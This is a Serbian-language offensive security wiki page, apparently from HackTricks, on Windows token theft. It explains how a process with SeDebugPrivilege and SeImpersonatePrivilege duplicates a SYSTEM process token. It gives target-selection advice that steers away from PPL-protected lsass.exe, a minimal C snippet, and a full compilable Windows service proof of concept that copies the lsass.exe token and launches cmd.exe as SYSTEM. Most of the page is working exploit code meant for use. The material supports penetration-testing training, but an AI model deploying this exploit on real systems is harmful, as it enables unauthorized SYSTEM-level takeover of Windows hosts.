# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Ova stranica pokriva varijantu **manual token-theft** u kojoj kontekst **High Integrity** koji već ima **`SeDebugPrivilege`** i **`SeImpersonatePrivilege`** otvara odgovarajući **SYSTEM** proces, **duplira njegov token** i **pokreće novi proces** sa tim tokenom.

Ako vam je potrebna samo brza **SYSTEM** shell sesija iz privilegovanog admin procesa, pogledajte i:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Ako nemate putanju do process handle-a, ali imate **`SeImpersonatePrivilege`**, ruta **named-pipe / Potato** je obično jednostavnija:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Pre nego što pokušate putanju kopiranja tokena, potvrdite da se trenutni proces već nalazi u korisnom kontekstu:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Napomene:

- **`SeDebugPrivilege`** omogućava da otvorite mnoge **nezaštićene** SYSTEM procese čak i kada bi vas njihov DACL uobičajeno blokirao.
- **`SeImpersonatePrivilege`** je ono što omogućava praktičnu upotrebu funkcije **`CreateProcessWithTokenW`** nakon toga.
- Ako putanja kopiranja tokena obezbedi samo slab ili filtriran SYSTEM token, jednostavno ga preuzmite iz **drugog SYSTEM procesa**.

## Pažljivo izaberite ciljni proces

Ova tehnika se obično prikazuje na primeru procesa **`lsass.exe`**, ali je on na modernom Windowsu često **pogrešna meta**:

- Ako je omogućena zaštita **LSA Protection / RunAsPPL**, **`lsass.exe`** je zaštićen i običan administratorski proces sa privilegijom `SeDebugPrivilege` i dalje neće moći da ga otvori.<sup>[[2]](#references)</sup>
- Dajte prednost **ne-PPL SYSTEM procesima**, kao što su **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ili ranija instanca procesa **`svchost.exe`**.
- **Zaštićeni procesi** i neki posebni procesi, kao što su **`System`** ili **`csrss.exe`**, nisu realne user-mode mete za ovu tehniku.
- Koristite **Process Hacker / Process Explorer** sa povišenim privilegijama da proverite da li ciljni token zaista ima privilegije koje želite pre nego što ga duplicirate.

## API detalji koji su važni u praksi

Mnogi javno dostupni PoC-ovi zahtevaju **`PROCESS_ALL_ACCESS`** i **`TOKEN_ALL_ACCESS`**, ali to stvara više buke nego što je potrebno. U praksi:

- Otvorite ciljni proces samo sa pravima koja su vam potrebna (obično **`PROCESS_QUERY_INFORMATION`** ili **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Otvorite token sa pravima potrebnim za kreiranje procesa: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Koristite **`DuplicateTokenEx(..., TokenPrimary, ...)`** da biste kreirali **primarni token**; sam impersonation token nije dovoljan za kreiranje novog procesa.
- Ako **`CreateProcessWithTokenW`** ne uspe sa greškom **`1314`**, pređite na **`CreateProcessAsUserW`**.
- Ako pokrećete proces iz **service / Session 0**, imajte na umu da **`CreateProcessWithTokenW`** zadržava child proces u **session** pozivaoca. Ako vam je potreban vidljiv desktop shell, koristite **`CreateProcessAsUserW`** i premestite token u željenu sesiju.<sup>[[1]](#references)</sup>

Minimalni savremeni tok izgleda ovako:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Potpuni PoC za service

Sledeći kod **eksploatiše privilegije `SeDebugPrivilege` i `SeImpersonatePrivilege`** kako bi kopirao token iz **procesa koji se izvršava kao SYSTEM** i sa **svim token privilegijama**. U ovom slučaju, kod se može kompajlirati i koristiti kao **Windows service binary** za proveru da li primitive funkcioniše.<sup>[[3]](#references)</sup>

Glavni deo **koda u kojem dolazi do eskalacije** nalazi se unutar funkcije **`Exploit`**. Unutar te funkcije možete videti da se **`lsass.exe`** pretražuje, njegov **token se kopira**, a zatim se taj token koristi za pokretanje novog **`cmd.exe`** sa svim privilegijama kopiranog tokena.

Na modernim hostovima često ćete želeti da zamenite **`lsass.exe`** drugim **SYSTEM procesom koji nije PPL**, kao što su **`winlogon.exe`**, **`wininit.exe`** ili **`services.exe`**.

Drugi procesi koji se izvršavaju kao SYSTEM i imaju sve ili većinu token privilegija su: **`services.exe`**, **`svchost.exe`** (neki od prvih), **`wininit.exe`**, **`csrss.exe`**... Imajte na umu da generalno **nećete moći da kopirate token iz zaštićenog procesa**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Reference

- [1] [CreateProcessWithTokenW funkcija (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Konfigurisanje dodatne LSA zaštite (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Pokretanje mog programa kao servisa (cboard.cprogramming.com) – Windows service kostur korišćen u PoC-u](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
